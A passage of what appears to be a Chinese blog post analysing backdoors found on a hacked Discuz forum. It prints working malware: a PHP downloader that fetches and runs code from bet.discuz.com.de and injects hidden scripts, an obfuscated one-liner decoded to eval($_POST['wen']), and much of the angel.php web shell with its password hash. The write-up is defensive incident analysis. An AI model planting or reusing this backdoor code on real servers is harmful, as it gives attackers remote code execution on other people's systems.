<span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">function_exists(</span><span style="color: #8abeb7;">'curl_exec'</span>)) {
$<span style="color: #f0c674;">sp_curl</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">curl_init(</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">curl_setopt(</span>$<span style="color: #f0c674;">sp_curl</span>, <span style="color: #cc6666; font-weight: bold;">CURLOPT_URL</span>, $<span style="color: #f0c674;">data_url</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">curl_setopt(</span>$<span style="color: #f0c674;">sp_curl</span>, <span style="color: #cc6666; font-weight: bold;">CURLOPT_HEADER</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">curl_setopt(</span>$<span style="color: #f0c674;">sp_curl</span>, <span style="color: #cc6666; font-weight: bold;">CURLOPT_CONNECTTIMEOUT</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">5</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">curl_setopt(</span>$<span style="color: #f0c674;">sp_curl</span>, <span style="color: #cc6666; font-weight: bold;">CURLOPT_RETURNTRANSFER</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>);
$<span style="color: #f0c674;">contents</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">curl_exec(</span>$<span style="color: #f0c674;">sp_curl</span>);
@<span style="color: #c5c8c6; background-color: #1d1f21;">curl_close(</span>$<span style="color: #f0c674;">sp_curl</span>);
}<span style="color: #b5bd68;">elseif</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">function_exists(</span><span style="color: #8abeb7;">'stream_context_create'</span>)) {
$<span style="color: #f0c674;">sp_cont</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'http'</span> =<span style="color: #81a2be;">&gt;</span> <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'method'</span> =&gt; <span style="color: #8abeb7;">'GET'</span>,<span style="color: #8abeb7;">'timeout'</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">5</span>));
$<span style="color: #f0c674;">sp_stre</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">stream_context_create(</span>$<span style="color: #f0c674;">sp_cont</span>);
$<span style="color: #f0c674;">contents</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">file_get_contents(</span>$<span style="color: #f0c674;">data_url</span>, <span style="color: #81a2be;">false</span>, $<span style="color: #f0c674;">sp_stre</span>);
}<span style="color: #b5bd68;">else</span>{
$<span style="color: #f0c674;">handle</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">fopen(</span>$<span style="color: #f0c674;">data_url</span>, <span style="color: #8abeb7;">"rb"</span>);<span style="color: #cc6666; background-color: #373b41;"> </span>
$<span style="color: #f0c674;">contents</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">stream_get_contents(</span>$<span style="color: #f0c674;">handle</span>);<span style="color: #cc6666; background-color: #373b41;"> </span>
@<span style="color: #c5c8c6; background-color: #1d1f21;">fclose(</span>$<span style="color: #f0c674;">handle</span>);
}
<span style="color: #b5bd68;">return</span> $<span style="color: #f0c674;">contents</span>;
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">show</span>($<span style="color: #f0c674;">fileDir</span>){
$<span style="color: #f0c674;">filename</span>=$<span style="color: #f0c674;">fileDir</span><span style="color: #cc6666; font-weight: bold;">.</span><span style="color: #c5c8c6; background-color: #1d1f21;">md5(</span>$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_HOST'</span>].$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'REQUEST_URI'</span>]);
<span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">is_file(</span>$<span style="color: #f0c674;">filename</span>)){
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fp</span>=@<span style="color: #c5c8c6; background-color: #1d1f21;">fopen(</span>$<span style="color: #f0c674;">filename</span>,<span style="color: #8abeb7;">'r'</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">data</span>=@<span style="color: #c5c8c6; background-color: #1d1f21;">fread(</span>$<span style="color: #f0c674;">fp</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">filesize(</span>$<span style="color: #f0c674;">filename</span>));
<span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">fclose(</span>$<span style="color: #f0c674;">fp</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">empty(</span>$<span style="color: #f0c674;">data</span>)) {@<span style="color: #c5c8c6; background-color: #1d1f21;">unlink(</span>$<span style="color: #f0c674;">filename</span>);<span style="color: #b5bd68;">return</span>;}
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">dec0de(</span>$<span style="color: #f0c674;">fileDir</span>,$<span style="color: #f0c674;">data</span>);
} <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">data</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">getdata(</span><span style="color: #8abeb7;">'http://bet.discuz.com.de/w0shiOo7.php?HOST='</span>.$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_H</span><span style="color: #8abeb7; text-decoration: underline;">OST'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fp</span>=@<span style="color: #c5c8c6; background-color: #1d1f21;">fopen(</span>$<span style="color: #f0c674;">filename</span>,<span style="color: #8abeb7;">'w'</span>);
<span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">fwrite(</span>$<span style="color: #f0c674;">fp</span>,$<span style="color: #f0c674;">data</span>);
<span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">fclose(</span>$<span style="color: #f0c674;">fp</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">strlen(</span>$<span style="color: #f0c674;">data</span>) &gt; <span style="color: #c5c8c6; background-color: #1d1f21;">1000</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">dec0de(</span>$<span style="color: #f0c674;">fileDir</span>,$<span style="color: #f0c674;">data</span>);
<span style="background-color: #373b41;"> </span>   }
}}
<span style="color: #b5bd68;">if</span>(!<span style="color: #c5c8c6; background-color: #1d1f21;">in_array(</span>$<span style="color: #f0c674;">IP</span>,$<span style="color: #f0c674;">KIP</span>)){
<span style="color: #b5bd68;">foreach</span>($<span style="color: #f0c674;">KBot</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">KBots</span>){<span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">stristr(</span>$<span style="color: #f0c674;">Bot</span>,$<span style="color: #f0c674;">KBots</span>)){
<span style="color: #c5c8c6; background-color: #1d1f21;">show(</span>$<span style="color: #f0c674;">fileDir</span>);
}}<span style="color: #b5bd68;">foreach</span>($<span style="color: #f0c674;">Key</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">Keys</span>){
<span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">stristr(</span>$<span style="color: #f0c674;">Ref</span>,$<span style="color: #f0c674;">Keys</span>)){
<span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">"&lt;div style='display:none'&gt;&lt;script language='javascript' src='http://count3</span><span style="color: #8abeb7; text-decoration: underline;">1.51yes.com/click.aspx?id=310940343&amp;logo=1' charset='gb2312'&gt;&lt;/script&gt;&lt;/div&gt;&lt;script type='text/javascript' src='http://api.discuz.com.de/Seo.js'&gt;&lt;/script&gt;"</span><span style="text-decoration: underline;">;}}}</span>
</pre>
</div>
</li>
</ul>

<p>
上面代码的目的就是下载恶意代码并执行。  
</p>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">继续排查</h2>
<div class="outline-text-2" id="text-4">
<p>
通过比较svn中的代码与现网的代码还发现了一个新的后门程序
</p>

<ul class="org-ul">
<li><code>uc_client/control/class.php</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #b294bb;">&lt;?php</span> $<span style="color: #f0c674;">mt</span>=<span style="color: #8abeb7;">"mFsKCleRfU"</span>; $<span style="color: #f0c674;">ojj</span>=<span style="color: #8abeb7;">"IEBleldle"</span>; $<span style="color: #f0c674;">hsa</span>=<span style="color: #8abeb7;">"E9TVFsnd2VuJ10p"</span>; $<span style="color: #f0c674;">fnx</span>=<span style="color: #8abeb7;">"Ow=="</span>; $<span style="color: #f0c674; text-decoration: underline;">zk</span><span style="text-decoration: underline;"> = </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">str_replace(</span><span style="color: #8abeb7; text-decoration: underline;">"d"</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">""</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">"sdtdrd_redpdldadcde"</span><span style="text-decoration: underline;">); $</span><span style="color: #f0c674; text-decoration: underline;">ef</span><span style="text-decoration: underline;"> = $</span><span style="color: #f0c674; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">"z"</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">""</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">"zbazsze64_zdzeczodze"</span><span style="text-decoration: underline;">); $</span><span style="color: #f0c674; text-decoration: underline;">dva</span><span style="text-decoration: underline;"> = $</span><span style="color: #f0c674; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">"p"</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">""</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">"pcprpepaptpe_fpupnpcptpipopn"</span><span style="text-decoration: underline;">); $</span><span style="color: #f0c674; text-decoration: underline;">zvm</span><span style="text-decoration: underline;"> = $</span><span style="color: #f0c674; text-decoration: underline;">dva</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">, $</span><span style="color: #f0c674; text-decoration: underline;">ef</span><span style="text-decoration: underline;">($</span><span style="color: #f0c674; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">"le"</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">""</span><span style="text-decoration: underline;">, $</span><span style="color: #f0c674; text-decoration: underline;">ojj</span><span style="color: #cc6666; font-weight: bold; text-decoration: underline;">.</span><span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">mt</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">hsa</span><span style="color: #cc6666; font-weight: bold; text-decoration: underline;">.</span><span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">fnx</span><span style="text-decoration: underline;">))); $</span><span style="color: #f0c674; text-decoration: underline;">zvm</span><span style="text-decoration: underline;">(); </span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span>
</pre>
</div>

<p>
解码后的结果
</p>

<div class="org-src-container">

<pre class="src src-php">@<span style="color: #c5c8c6; background-color: #1d1f21;">eval(</span>$<span style="color: #81a2be;">_POST</span>[<span style="color: #8abeb7;">'wen'</span>]);
</pre>
</div>

<p>
上面的脚本可以注入任意的代码。
</p>
</li>

<li><code>./uc_server/data/tmp/angel.php</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #b294bb;">&lt;?php</span>
<span style="color: #c5c8c6; background-color: #1d1f21;">error_reporting(7</span>);
@<span style="color: #c5c8c6; background-color: #1d1f21;">set_magic_quotes_runtime(0</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">ob_start(</span>);
$<span style="color: #f0c674;">mtime</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">explode(</span><span style="color: #8abeb7;">' '</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">microtime(</span>));
$<span style="color: #f0c674;">starttime</span> = $<span style="color: #f0c674;">mtime</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>] + $<span style="color: #f0c674;">mtime</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>];
<span style="color: #c5c8c6; background-color: #1d1f21;">define(</span><span style="color: #8abeb7;">'SA_ROOT'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">str_replace(</span><span style="color: #8abeb7;">'\\'</span>, <span style="color: #8abeb7;">'/'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">dirname(</span><span style="color: #81a2be;">__FILE__</span>)).<span style="color: #8abeb7;">'/'</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">define(</span><span style="color: #8abeb7;">'IS_WIN'</span>, <span style="color: #81a2be;">DIRECTORY_SEPARATOR</span> == <span style="color: #8abeb7;">'\\'</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">define(</span><span style="color: #8abeb7;">'IS_COM'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">class_exists(</span><span style="color: #8abeb7;">'COM'</span>) ? <span style="color: #c5c8c6; background-color: #1d1f21;">1</span> : <span style="color: #c5c8c6; background-color: #1d1f21;">0</span> );
<span style="color: #c5c8c6; background-color: #1d1f21;">define(</span><span style="color: #8abeb7;">'IS_GPC'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">get_magic_quotes_gpc(</span>));
$<span style="color: #f0c674;">dis_func</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">get_cfg_var(</span><span style="color: #8abeb7;">'disable_functions'</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">define(</span><span style="color: #8abeb7;">'IS_PHPINFO'</span>, (!<span style="color: #c5c8c6; background-color: #1d1f21;">eregi(</span><span style="color: #8abeb7;">"phpinfo"</span>,$<span style="color: #f0c674;">dis_func</span>)) ? <span style="color: #c5c8c6; background-color: #1d1f21;">1</span> : <span style="color: #c5c8c6; background-color: #1d1f21;">0</span> );
@<span style="color: #c5c8c6; background-color: #1d1f21;">set_time_limit(0</span>);@<span style="color: #c5c8c6; background-color: #1d1f21;">preg_replace(</span><span style="color: #8abeb7;">"/[email]/e"</span>,$<span style="color: #81a2be;">_POST</span>[<span style="color: #8abeb7;">'Id'</span>],<span style="color: #8abeb7;">"error"</span>);

<span style="color: #b5bd68;">foreach</span>($<span style="color: #81a2be;">_POST</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">key</span> =<span style="color: #81a2be;">&gt;</span> $<span style="color: #f0c674;">value</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #cc6666; font-weight: bold;">IS_GPC</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">value</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">s_array(</span>$<span style="color: #f0c674;">value</span>);
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">$key</span> = $<span style="color: #f0c674;">value</span>;
}
<span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">===================== &#31243;&#24207;&#37197;&#32622; =====================*/</span>

<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">echo encode_pass('angel');exit;</span>
<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">angel = ec38fe2a8497e0a8d6d349b3533038cb</span>
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#22914;&#26524;&#38656;&#35201;&#23494;&#30721;&#39564;&#35777;,&#35831;&#20462;&#25913;&#30331;&#38470;&#23494;&#30721;,&#30041;&#31354;&#20026;&#19981;&#38656;&#35201;&#39564;&#35777;</span>
$<span style="color: #f0c674;">pass</span>  = <span style="color: #8abeb7;">'ec38fe2a8497e0a8d6d349b3533038cb'</span>; <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">angel</span>

<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#22914;&#24744;&#23545; cookie &#20316;&#29992;&#33539;&#22260;&#26377;&#29305;&#27530;&#35201;&#27714;, &#25110;&#30331;&#24405;&#19981;&#27491;&#24120;, &#35831;&#20462;&#25913;&#19979;&#38754;&#21464;&#37327;, &#21542;&#21017;&#35831;&#20445;&#25345;&#40664;&#35748;</span>
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">cookie &#21069;&#32512;</span>
$<span style="color: #f0c674;">cookiepre</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">cookie &#20316;&#29992;&#22495;</span>
$<span style="color: #f0c674;">cookiedomain</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">cookie &#20316;&#29992;&#36335;&#24452;</span>
$<span style="color: #f0c674;">cookiepath</span> = <span style="color: #8abeb7;">'/'</span>;
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">cookie &#26377;&#25928;&#26399;</span>
$<span style="color: #f0c674;">cookielife</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">86400</span>;

<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#31243;&#24207;&#25628;&#32034;&#21487;&#20889;&#25991;&#20214;&#30340;&#31867;&#22411;</span>
!$<span style="color: #f0c674;">writabledb</span> &amp;&amp; $<span style="color: #f0c674;">writabledb</span> = <span style="color: #8abeb7;">'php,cgi,pl,asp,inc,js,html,htm,jsp'</span>;
<span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">===================== &#37197;&#32622;&#32467;&#26463; =====================*/</span>

$<span style="color: #f0c674;">charsetdb</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">''</span>,<span style="color: #8abeb7;">'armscii8'</span>,<span style="color: #8abeb7;">'ascii'</span>,<span style="color: #8abeb7;">'big5'</span>,<span style="color: #8abeb7;">'binary'</span>,<span style="color: #8abeb7;">'cp1250'</span>,<span style="color: #8abeb7;">'cp1251'</span>,<span style="color: #8abeb7;">'cp12</span><span style="color: #8abeb7; text-decoration: underline;">56'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'cp1257'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'cp850'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'cp852'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'cp866'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'cp932'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'dec8'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'euc-jp'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'euc-kr'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'gb2312'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'gbk'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'geostd8'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'greek'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'hebrew'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'hp8'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'keybcs2'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'koi8r'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'koi8u'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'latin1'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'latin2'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'latin5'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'latin7'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'macce'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'macroman'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'sjis'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'swe7'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'tis620'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'ucs2'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'ujis'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'utf8'</span><span style="text-decoration: underline;">);</span>
<span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">charset</span> == <span style="color: #8abeb7;">'utf8'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">header(</span><span style="color: #8abeb7;">"content-Type: text/html; charset=utf-8"</span>);
} <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">charset</span> == <span style="color: #8abeb7;">'big5'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">header(</span><span style="color: #8abeb7;">"content-Type: text/html; charset=big5"</span>);
} <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">charset</span> == <span style="color: #8abeb7;">'gbk'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">header(</span><span style="color: #8abeb7;">"content-Type: text/html; charset=gbk"</span>);
} <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">charset</span> == <span style="color: #8abeb7;">'latin1'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">header(</span><span style="color: #8abeb7;">"content-Type: text/html; charset=iso-8859-2"</span>);
} <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">charset</span> == <span style="color: #8abeb7;">'euc-kr'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">header(</span><span style="color: #8abeb7;">"content-Type: text/html; charset=euc-kr"</span>);
} <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">charset</span> == <span style="color: #8abeb7;">'euc-jp'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">header(</span><span style="color: #8abeb7;">"content-Type: text/html; charset=euc-jp"</span>);
}

$<span style="color: #f0c674;">self</span> = $<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'PHP_SELF'</span>] ? $<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'PHP_SELF'</span>] : $<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'SCRIPT_NAME'</span>];
$<span style="color: #f0c674;">timestamp</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">time(</span>);

<span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">===================== &#36523;&#20221;&#39564;&#35777; =====================*/</span>
<span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">"logout"</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">scookie(</span><span style="color: #8abeb7;">'loginpass'</span>, <span style="color: #8abeb7;">''</span>, -<span style="color: #c5c8c6; background-color: #1d1f21;">86400</span> * <span style="color: #c5c8c6; background-color: #1d1f21;">365</span>);
<span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">header(</span><span style="color: #8abeb7;">'Location: '</span>.$<span style="color: #f0c674;">self</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
}
<span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">pass</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'login'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">pass</span> == <span style="color: #c5c8c6; background-color: #1d1f21;">encode_pass(</span>$<span style="color: #f0c674;">password</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">scookie(</span><span style="color: #8abeb7;">'loginpass'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">encode_pass(</span>$<span style="color: #f0c674;">password</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">header(</span><span style="color: #8abeb7;">'Location: '</span>.$<span style="color: #f0c674;">self</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #81a2be;">_COOKIE</span>[<span style="color: #8abeb7;">'loginpass'</span>]) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #81a2be;">_COOKIE</span>[<span style="color: #8abeb7;">'loginpass'</span>] != $<span style="color: #f0c674;">pass</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">loginpage(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">loginpage(</span>);
<span style="background-color: #373b41;"> </span>   }
}
<span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">===================== &#39564;&#35777;&#32467;&#26463; =====================*/</span>

$<span style="color: #f0c674;">errmsg</span> = <span style="color: #8abeb7;">''</span>;
!$<span style="color: #f0c674;">action</span> &amp;&amp; $<span style="color: #f0c674;">action</span> = <span style="color: #8abeb7;">'file'</span>;

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#26597;&#30475;PHPINFO</span>
<span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'phpinfo'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #cc6666; font-weight: bold;">IS_PHPINFO</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">phpinfo(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">errmsg</span> = <span style="color: #8abeb7;">'phpinfo() function has non-permissible'</span>;
<span style="background-color: #373b41;"> </span>   }
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#19979;&#36733;&#25991;&#20214;</span>
<span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'downfile'</span> &amp;&amp; $<span style="color: #f0c674;">thefile</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!@<span style="color: #c5c8c6; background-color: #1d1f21;">file_exists(</span>$<span style="color: #f0c674;">thefile</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">errmsg</span> = <span style="color: #8abeb7;">'The file you want Downloadable was nonexistent'</span>;
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fileinfo</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">pathinfo(</span>$<span style="color: #f0c674;">thefile</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">header(</span><span style="color: #8abeb7;">'Content-type: application/x-'</span>.$<span style="color: #f0c674;">fileinfo</span>[<span style="color: #8abeb7;">'extension'</span>]);
